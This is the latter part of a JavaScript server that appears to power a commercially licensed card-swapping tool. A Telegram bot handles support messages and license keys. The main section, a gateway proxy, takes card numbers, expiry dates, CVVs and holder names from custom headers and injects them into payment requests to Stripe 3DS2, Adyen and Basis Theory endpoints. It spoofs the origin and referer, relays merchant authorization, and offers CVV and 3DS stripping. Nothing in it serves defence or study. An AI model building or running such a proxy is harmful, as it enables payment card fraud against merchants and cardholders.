    const targetLang = USER_LANG.get(String(alvo)) || 'pt';
    await tgSend(alvo, `<b>◈ ──『 ✉ MENSAGEM DO SUPORTE 』── ◈</b>\n<code>${UI.sep}</code>\n\n${texto}\n\n<code>${UI.sep}</code>\n<i>Mozlince Nebula · Asheo Systems</i>`, { inline_keyboard: [[{ text: '✆  CONTACTAR SUPORTE', callback_data:'m_contacto' }]] });
    await salvarConversa(alvo, 'out', texto);
    await tgSend(chatId, `✓ Mensagem enviada → <code>${alvo}</code>`);
    return;
  }
  const sessao = SUPPORT_SESSIONS.get(String(chatId));
  if (sessao && sessao.step === 'waiting') {
    if (cmd === '/cancelar' || cmd === '/cancel' || cmd === 'cancelar' || cmd === 'cancel') { SUPPORT_SESSIONS.delete(String(chatId)); await tgSend(chatId, `<b>✕  Suporte cancelado</b>`); return; }
    SUPPORT_SESSIONS.delete(String(chatId));
    const userInfo = `${msg.from.first_name||''} ${msg.from.last_name||''}`.trim() || 'Sem nome';
    const username = msg.from.username ? `@${msg.from.username}` : 'sem username';
    await tgSend(chatId, `${UI.header(lang)}\n\n<b>✓  MENSAGEM ENVIADA</b>\n<code>${UI.sep}</code>\n\nSua mensagem foi encaminhada.\nTempo de resposta: até 24h`, { inline_keyboard: [[{ text: '‹  Menu', callback_data:'m_home' }]] });
    if (!isOwner) {
      await salvarConversa(chatId, 'in', texto);
      await tgSend(OWNER_ID, `<b>◈ ──『 ✆ NOVA MENSAGEM 』── ◈</b>\n<code>${UI.sep}</code>\n<b>◉  Nome:</b> ${escapeHtml(userInfo)}\n<b>◈  User:</b> ${escapeHtml(username)}\n<b>⌬  Chat ID:</b> <code>${chatId}</code>\n<code>${UI.sep}</code>\n<b>✎  Mensagem:</b>\n${escapeHtml(texto)}\n\n<code>${UI.sep}</code>\n<i>Responda com:</i>\n<code>/resp ${chatId} sua mensagem</code>`);
    }
    return;
  }
  if (!isOwner) {
    if (cmd === '/start' || cmd === '/contacto' || cmd === '/contact' || cmd === '/ajuda' || cmd === '/help' || cmd === '/lang') {
      if (cmd === '/lang') { await tgSend(chatId, `<b>◐  Escolha seu idioma / Choose your language:</b>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }]] }); return; }
      await tgSend(chatId, `${UI.header(lang)}\n\n<b>◈  Bem-vindo ao Mozlince Nebula</b>\n<code>${UI.sep}</code>\n<i>Para adquirir uma licença premium, clique abaixo:</i>`, { inline_keyboard: [[{ text: '✆  CONTACTAR SUPORTE', callback_data:'m_contacto' }],[{ text: '◐  Idioma / Language', callback_data:'m_lang' }]] });
      return;
    }
    await salvarConversa(chatId, 'in', texto);
    const userInfo = `${msg.from.first_name||''} ${msg.from.last_name||''}`.trim() || 'Sem nome';
    const username = msg.from.username ? '@'+msg.from.username : 'sem username';
    await tgSend(OWNER_ID, `📥  NOVA MENSAGEM RECEBIDA\n<code>${UI.sep}</code>\n<b>◉</b> ${escapeHtml(userInfo)}\n<b>◈</b> ${escapeHtml(username)}\n<b>⌬</b> <code>${chatId}</code>\n<code>${UI.sep}</code>\n${escapeHtml(texto)}\n\n<code>${UI.sep}</code>\n<i>Responda com: /resp &lt;chatId&gt; &lt;msg&gt;</i>`);
    return;
  }
  try {
    if (cmd === '/start' || cmd === '/menu') { await cmdStart(chatId); return; }
    if (cmd === '/lang') { await tgSend(chatId, `<b>◐  Escolha seu idioma / Choose your language:</b>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }]] }); return; }
    if (cmd === '/usuarios' || cmd === '/users') {
      const users = await listarUsuarios();
      if (users.length === 0) { await tgSend(chatId, `<i>Nenhum usuário registrado ainda.</i>`); return; }
      let txt = `<b>◈  USUÁRIOS CONHECIDOS</b>  <code>(${users.length})</code>\n<code>${UI.sep}</code>\n\n`;
      for (const u of users.slice(0, 30)) { const last = new Date(u.lastSeen).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}); txt += `<b>◉</b> ${escapeHtml(u.nome)}  ${u.username ? '(<code>'+escapeHtml(u.username)+'</code>)' : ''}\n   ⌬ <code>${u.chatId}</code> · <i>${last}</i>\n`; }
      txt += `\nUse /dm &lt;@user|chatId&gt; &lt;msg&gt;`;
      await tgSend(chatId, txt);
      return;
    }
    if (cmd === '/dm') {
      const targetTerm = args[1], msgTxt = args.slice(2).join(' ');
      if (!targetTerm || !msgTxt) { await tgSend(chatId, `⚠  <code>/dm &lt;@usuario|chatId&gt; &lt;mensagem&gt;</code>`); return; }
      const u = await buscarUsuario(targetTerm);
      if (!u) { await tgSend(chatId, `✕  Usuário não encontrado: <code>${escapeHtml(targetTerm)}</code>`); return; }
      const targetLang = USER_LANG.get(String(u.chatId)) || 'pt';
      await tgSend(u.chatId, `<b>◈ ──『 ✉ MENSAGEM DO SUPORTE 』── ◈</b>\n<code>${UI.sep}</code>\n\n${escapeHtml(msgTxt)}\n\n<code>${UI.sep}</code>\n<i>Mozlince Nebula · Asheo Systems</i>`, { inline_keyboard: [[{ text: '✆  CONTACTAR SUPORTE', callback_data:'m_contacto' }]] });
      await salvarConversa(u.chatId, 'out', msgTxt);
      await tgSend(chatId, `✓ Mensagem enviada → ${escapeHtml(u.username || u.nome)} (<code>${u.chatId}</code>)`);
      return;
    }
    if (cmd === '/conversa' || cmd === '/conv') {
      const target = args[1];
      if (!target) { await tgSend(chatId, `⚠  /conversa &lt;chatId&gt;`); return; }
      const hist = await lerConversa(target);
      let txt = `<b>💬  CONVERSA</b> <code>${target}</code>\n<code>${UI.sep}</code>\n\n`;
      if (hist.length === 0) txt += `<i>Sem histórico com este usuário.</i>`;
      else for (const m of hist.slice(-20)) { const hora = new Date(m.ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'}); txt += `${m.dir==='in'?'👤':'👑'} <i>${hora}</i>\n${escapeHtml(m.txt)}\n\n`; }
      await tgSend(chatId, txt);
      return;
    }
    if (cmd === '/limparconversa' || cmd === '/clearchat') {
      const target = args[1];
      if (!target) { await tgSend(chatId, `⚠  /limparconversa &lt;chatId&gt;`); return; }
      await limparConversa(target);
      await tgSend(chatId, `✓ Histórico limpo`);
      return;
    }
    if (cmd === '/resp') {
      const target = args[1], resposta = args.slice(2).join(' ');
      if (!target || !resposta) { await tgSend(chatId, `⚠  <code>/resp &lt;chatId&gt; &lt;mensagem&gt;</code>`); return; }
      const targetLang = USER_LANG.get(String(target)) || 'pt';
      await tgSend(target, `<b>◈ ──『 ✆ RESPOSTA DO SUPORTE 』── ◈</b>\n<code>${UI.sep}</code>\n\n${escapeHtml(resposta)}\n\n<code>${UI.sep}</code>\n<i>Mozlince Nebula Support</i>`, { inline_keyboard: [[{ text: '✆  CONTACTAR SUPORTE', callback_data:'m_contacto' }]] });
      await salvarConversa(target, 'out', resposta);
      await tgSend(chatId, `✓  Resposta enviada para <code>${target}</code>`);
      return;
    }
    if (cmd === '/gerar') { const kb = { inline_keyboard: [] }; const entries = Object.entries(PACOTES); for (let i = 0; i < entries.length; i += 2) { const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }]; if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` }); kb.inline_keyboard.push(linha); } await tgSend(chatId, `<b>⚡  Gerar Licença</b>`, kb); return; }
    if (cmd === '/listar') { const keys = await redisKeys('ASHEO-*'); if (keys.length === 0) { await tgSend(chatId, `<i>Nenhuma licença cadastrada.</i>`); return; } let txt = `<b>◈  Minhas Licenças (${keys.length})</b>\n<code>${UI.sep}</code>\n`; for (let i = 0; i < Math.min(keys.length, 30); i++) { const l = await redisGet(keys[i]); if (!l) continue; const exp = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const emoji = l.lifetime ? '∞' : (l.ativa ? '●' : '○'); txt += `<b>${emoji}</b> <code>${keys[i]}</code>\n   <i>${l.planoNome} · ${exp}</i>\n`; } await tgSend(chatId, txt); return; }
    if (cmd === '/status') { const k = args[1]; if (!k) { await tgSend(chatId, `/status &lt;chave&gt;`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕  Não encontrada`); return; } const resta = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const pk = PACOTES[l.plano] || { emoji:'◆' }; await tgSend(chatId, `<b>◉  Detalhes da Licença</b>\n<code>${UI.sep}</code>\n<b>⌬  Chave:</b> <code>${k}</code>\n<b>${pk.emoji}  Plano:</b> ${l.planoNome}\n<b>◆  Preço:</b> ${precoFmt(l.preco)}\n<b>◔  Emitida:</b> ${formatDate(l.criadaEm)}\n<b>◕  Expira:</b> ${l.lifetime?'Nunca':formatDate(l.expiraEm)}\n<b>⟡  Restante:</b> ${resta}\n<b>∞  Lifetime:</b> ${l.lifetime?'✓':'✕'}\n<b>◉  Status:</b> ${l.ativa?'● Ativa':'○ Revogada'}`); return; }
    if (cmd === '/activate') { const chave = args[args.length-1], installId = args.slice(1, args.length-1).join(' '); if (!installId || !chave) { await tgSend(chatId, `/activate &lt;id&gt; &lt;chave&gt;`); return; } const l = await redisGet(chave); if (!l) { await tgSend(chatId, `✕  Inválida`); return; } if (l.installId) { await tgSend(chatId, `⚠  Já vinculada`); return; } l.installId = installId; l.ativadaEm = Date.now(); l.activationCount = (l.activationCount||0)+1; await redisSet(chave, JSON.stringify(l)); await redisSetRaw(`ASHEO-INSTALL-${normalizeKey(installId)}`, normalizeKey(chave)); await tgSend(chatId, `✓  Vinculada!\n⌬ <code>${chave}</code>\n⟡ <code>${installId}</code>`); return; }
    if (cmd === '/desvincular') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕`); return; } l.installId = null; l.ativadaEm = null; await redisSet(k, JSON.stringify(l)); await tgSend(chatId, `⌬  Desvinculada`); return; }
    if (cmd === '/revogar') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕`); return; } l.ativa = false; await redisSet(k, JSON.stringify(l)); await tgSend(chatId, `✕  Revogada`); return; }
    if (cmd === '/deletar') { const k = args[1]; if (!k) { await tgSend(chatId, `⚠  <code>/deletar &lt;chave&gt;</code>`); return; } const l = await redisGet(k); if (!l) { await tgSend(chatId, `✕  Não encontrada`); return; } await redisDel(k); await tgSend(chatId, `✕  Deletada: <code>${k}</code>`); return; }
    if (cmd === '/deletartudo') { 
      const keys = await redisKeys('ASHEO-*'); 
      let n = 0;
      for (const k of keys) { 
        if (/^ASHEO-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(k)) {
          await redisDel(k); 
          n++;
        }
      } 
      await tgSend(chatId, `💣  <b>${n}</b> licenças apagadas.`); 
      return; 
    }
    if (cmd === '/stats') { const keys = await redisKeys('ASHEO-*'); let ativas=0, exp=0, vinc=0, life=0, receita=0; for (const k of keys) { const l = await redisGet(k); if (!l) continue; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) exp++; if (l.installId) vinc++; if (l.lifetime) life++; if (l.preco) receita += Number(l.preco) || 0; } await tgSend(chatId, `<b>◧  Estatísticas</b>\n<code>${UI.sep}</code>\n<b>◈</b> Total: <code>${keys.length}</code>\n<b>●</b> Ativas: <code>${ativas}</code>\n<b>○</b> Expiradas: <code>${exp}</code>\n<b>⟡</b> Vinculadas: <code>${vinc}</code>\n<b>∞</b> Lifetime: <code>${life}</code>\n<b>◆</b> Receita: <code>${precoFmt(receita)}</code>`); return; }
    await tgSend(chatId, `❓ Use /start`);
  } catch (e) { log('ERRO', 'Message: ' + e.message); }
}

app.post('/telegram-webhook', async (req, res) => { res.sendStatus(200); const update = req.body; try { if (update.callback_query) return handleCallback(update.callback_query); if (update.message && update.message.text) return handleMessage(update.message); } catch (e) { log('ERRO', 'Webhook: ' + e.message); } });

/* ═══════════════════════════════════════════════
   ◈ GATEWAY PROXY — CORAÇÃO DO SWAP
   ═══════════════════════════════════════════════ */
function injectCardIntoForm(raw, card) {
  const params = new URLSearchParams(raw || '');
  const map = {
    number: ['card[number]','card_number','number','ccnumber','account_number','pan','payment_method.card.number'],
    month: ['card[exp_month]','exp_month','expmonth','month','ccmonth','payment_method.card.exp_month','expiration_month'],
    year: ['card[exp_year]','exp_year','expyear','year','ccyear','payment_method.card.exp_year','expiration_year'],
    cvv: ['card[cvc]','card[cvv]','cvc','cvv','ccv','security_code','payment_method.card.cvc'],
    holder: ['card[name]','card[holder]','cardholder','name','holder_name','ccname','payment_method.card.name']
  };
  for (const [key, aliases] of Object.entries(map)) {
    const val = card[key];
    if (!val) continue;
    let injected = false;
    for (const alias of aliases) { if (params.has(alias)) { params.set(alias, val); injected = true; break; } }
    if (!injected && aliases[0]) params.append(aliases[0], val);
  }
  return params.toString();
}

function injectCardIntoJson(raw, card) {
  try {
    const j = JSON.parse(raw);
    // NÃO espalhar card na raiz. Apenas sobrescrever campos conhecidos se existirem.
    if (j.card && typeof j.card === 'object') {
      j.card.number = card.number || j.card.number;
      j.card.exp_month = card.month || j.card.exp_month;
      j.card.exp_year = card.year || j.card.exp_year;
      j.card.cvc = card.cvv || j.card.cvc;
      j.card.name = card.holderName || j.card.name;
    } else {
      // Se não tem objeto card, injeta na raiz (compatibilidade)
      j.number = card.number || j.number;
      j.exp_month = card.month || j.exp_month;
      j.exp_year = card.year || j.exp_year;
      j.cvc = card.cvv || j.cvc;
      j.name = card.holderName || j.name;
    }
    return JSON.stringify(j);
  } catch {
    return raw;
  }
}

async function gwProxyHandler(req, res) {
  const inicio = Date.now();
  const auth = validateAnyAuth(req);
  let target = req.headers['x-asheo-target'];
  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
  const cardRaw = req.headers['x-asheo-card'];
  const headersRaw = req.headers['x-asheo-headers'];
  const origin = req.headers['x-asheo-origin'] || '';
  const install = req.headers['x-asheo-install'] || '';
  const btHost = req.headers['x-asheo-bt-host'] || '';
  const clientKeyHeader = req.headers['x-asheo-clientkey'] || '';
  const removeCvvHeader = req.headers['x-asheo-remove-cvv'] === 'true';
  const strip3dsHeader = req.headers['x-asheo-3ds-strip'] === 'true';
  const swapOnlyHeader = req.headers['x-asheo-swap-only'] === 'true';
  const path = req.path;

  log('GW', `→ ${path} | target=${String(target||'').substring(0,70)} | inst=${String(install).substring(0,12)} | auth=${auth.ok?auth.mode||'bearer':'✕'}`);

  // 1. Parse do __asheo do body JSON (para Adyen, encgw, basistheory)
  let bodyOut = null;
  let asheoBody = null;
  let card = null;

  if (req.rawBody && req.rawBody.length > 0) {
    bodyOut = req.rawBody.toString('utf8');
    try {
      const parsed = JSON.parse(bodyOut);
      if (parsed && parsed.__asheo && typeof parsed.__asheo === 'object') {
        asheoBody = parsed.__asheo;
        // O body real está em parsed.body
        bodyOut = typeof parsed.body === 'string' ? parsed.body : JSON.stringify(parsed.body ?? '');
        log('GW', `${path} — __asheo extraído (card=${!!asheoBody.card}, clientKey=${!!asheoBody.clientKey})`);
      }
    } catch {}
  } else if (typeof req.body === 'string') {
    bodyOut = req.body;
  } else if (req.body && typeof req.body === 'object') {
    bodyOut = JSON.stringify(req.body);
  }

  // 2. Card pode vir do header x-asheo-card OU do __asheo.card
  if (cardRaw) { try { card = JSON.parse(cardRaw); } catch { log('WARN', `${path} — x-asheo-card inválido`); } }
  if (!card && asheoBody?.card) { card = asheoBody.card; log('GW', `${path} — cartão via __asheo.card`); }

  // 3. Reconstruir target para Basis Theory (se vier apenas o pathname /tokens)
  if (target && target.startsWith('/')) {
    if (btHost) {
      target = `https://${btHost}${target}`;
    } else {
      target = `https://js.basistheory.com${target}`;
    }
    log('GW', `${path} — target reconstruído para Basis Theory: ${target}`);
  }

  if (!target) { log('WARN', `${path} — missing x-asheo-target`); return res.status(400).json({ ok:false, error:'missing_target' }); }
  if (!isAllowed3dsTarget(target)) { log('WARN', `${path} — target NÃO PERMITIDO: ${String(target).substring(0,80)}`); return res.status(403).json({ ok:false, error:'target_not_allowed', target }); }
  if (!rateLimit('gw:' + (install || req.ip), 60, 60000)) { log('WARN', `${path} — rate limit ${install}`); return res.status(429).json({ ok:false, error:'rate_limited' }); }

  // 4. Preparar headers de forwarding
  let forwardHeaders = { 'user-agent': req.headers['user-agent'] || 'Mozilla/5.0', 'accept': 'application/json, text/plain, */*', 'accept-language': req.headers['accept-language'] || 'en-US,en;q=0.9' };
  try { if (headersRaw) { const parsed = JSON.parse(headersRaw); for (const [k, v] of Object.entries(parsed)) { if (typeof v === 'string' && !k.startsWith(':')) forwardHeaders[k.toLowerCase()] = v; } } } catch (e) { log('WARN', `${path} — x-asheo-headers inválido`); }
  if (origin) { try { const ou = new URL(origin); forwardHeaders['origin'] = ou.origin; forwardHeaders['referer'] = ou.origin + '/'; } catch {} }
  
  // Auth original do merchant (x-asheo-auth)
  const origAuth = req.headers['x-asheo-auth'];
  if (origAuth) { forwardHeaders['authorization'] = origAuth; log('GW', `${path} — x-asheo-auth repassado`); }

  const ctype = forwardHeaders['content-type'] || 'application/x-www-form-urlencoded';

  // 5. Injetar cartão no body se aplicável
  if (card && bodyOut) {
    const isJson = ctype.includes('json');
    const isForm = ctype.includes('form-urlencoded');
    if (isForm) {
      bodyOut = injectCardIntoForm(bodyOut, card);
      log('GW', `${path} — cartão injetado no form`);
    } else if (isJson) {
      bodyOut = injectCardIntoJson(bodyOut, card);
      log('GW', `${path} — cartão injetado no JSON`);
    }
  }

  // 6. Se removeCvv, remover do form ou json (simplificado, para body urlencoded)
  if ((removeCvvHeader || asheoBody?.removeCvv) && bodyOut && ctype.includes('form-urlencoded')) {
    const params = new URLSearchParams(bodyOut);
    params.delete('cvv');
    params.delete('cvc');
    params.delete('card[cvc]');
    params.delete('card[cvv]');
    bodyOut = params.toString();
    log('GW', `${path} — CVV removido do form`);
  }

  try {
    const upstream = await fetch(target, { method, headers: forwardHeaders, body: bodyOut, redirect: 'manual' });
    const respCt = upstream.headers.get('content-type') || 'application/json';
    const respBody = await upstream.text();
    const elapsed = Date.now() - inicio;
    log('OK', `${path} ← ${upstream.status} | ${elapsed}ms`);
    
    res.status(upstream.status);
    res.setHeader('content-type', respCt);
    res.setHeader('x-asheo-upstream-status', String(upstream.status));
    res.setHeader('x-asheo-proxied', '1');
    res.setHeader('x-asheo-elapsed-ms', String(elapsed));
    
    // Repassar headers de veredito do upstream (se existirem)
    for (const h of ['x-asheo-3ds2-verdict', 'x-asheo-3ds2-attempts', 'x-asheo-3ds2-trail', 'x-asheo-swap-ok', 'x-asheo-swapped', 'x-asheo-adyen-verdict', 'x-asheo-adyen-result', 'x-asheo-adyen-reason']) {
      const v = upstream.headers.get(h);
      if (v != null) res.setHeader(h, v);
    }
    
    return res.send(respBody);
  } catch (e) { 
    log('ERRO', `${path} upstream erro: ${e.message}`); 
    return res.status(502).json({ ok:false, error:'upstream_failed', message: e.message, target }); 
  }
}

app.all('/v1/gw/3ds2/authenticate', gwProxyHandler);
app.all('/v1/gw/3ds2/challenge', gwProxyHandler);
app.all('/v1/gw/3ds2/setup', gwProxyHandler);
app.all('/v1/gw/3ds2/*splat', (req, res, next) => { req.headers['x-asheo-target'] = req.headers['x-asheo-target'] || 'https://api.stripe.com/v1/3ds2/authenticate'; gwProxyHandler(req, res, next); });
app.all('/v1/gw/adyen/*splat', gwProxyHandler);
app.all('/v1/gw/*splat', gwProxyHandler);
app.all('/v1/gw/3ds2/authenticate', gwProxyHandler);
app.all('/v1/gw/3ds2/challenge', gwProxyHandler);
app.all('/v1/gw/3ds2/setup', gwProxyHandler);
app.all('/v1/gw/3ds2/authenticate', gwProxyHandler);
app.all('/v1/gw/3ds2/challenge', gwProxyHandler);
app.all('/v1/process', gwProxyHandler);

/* ═══ CAMPAIGN CLICK ═══ */
app.post('/v1/campaign/click', async (req, res) => {
  const { campaignId, installId } = req.body || {};
  log('API', `/v1/campaign/click id=${campaignId||'∅'}`);
  if (campaignId) { try { const key = `ASHEO-CAMPAIGN-CLICKS-${normalizeKey(campaignId)}`; const cur = parseInt(await redisGetRaw(key) || '0', 10); await redisSetRaw(key, String(cur + 1)); } catch {} }
  res.json({ ok:true, received:true, serverTime: Date.now() });
});

/* ═══ 404 ═══ */
app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });

/* ═══ START ═══ */
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  banner();
  log('SYS', `Mozlince Nebula v8.4.2 Quantum+ na porta ${PORT}`);
  log('SYS', `Chave: ${ORIGEM}`);
  log('SYS', `Redis: ${UPSTASH_URL ? 'OK' : 'FALTA'}`);
  log('SYS', `Telegram: ${TELEGRAM_TOKEN ? 'OK' : 'FALTA'}`);
  log('SYS', `Planos: ${Object.keys(PACOTES).length} (USD)`);
  log('RULES', `Payment Rules: ${PAYMENT_RULES.length} (v${RULES_VERSION})`);
  log('RULES', `Exclusive Targets: ${EXCLUSIVE_TARGETS.length}`);
  log('OK', `✔ encPack AES-256-GCM determinístico`);
  log('OK', `✔ kid=ASHEO-<prefix> | exp=iat+600 | secret determinístico`);
  log('OK', `✔ /v1/gw/3ds2/* + /v1/process (com parse __asheo)`);
  log('OK', `✔ Asheo-Pass + Bearer + HMAC (com anti-replay)`);
  log('OK', `✔ gzip em /v1/rules, /v1/exclusive/*, /v1/campaign`);
  log('OK', `✔ Bot Telegram premium + DM + Suporte + /resp`);
  log('OK', `✔ ROTAS PREMIUM PROTEGIDAS (validatePremiumAuth)`);
  log('OK', `✔ Manifest como JWT STRING assinado`);
});

process.on('uncaughtException', e => log('ERRO', 'Uncaught: ' + e.message));
process.on('unhandledRejection', e => log('ERRO', 'Rejection: ' + (e instanceof Error ? e.stack : JSON.stringify(e))));
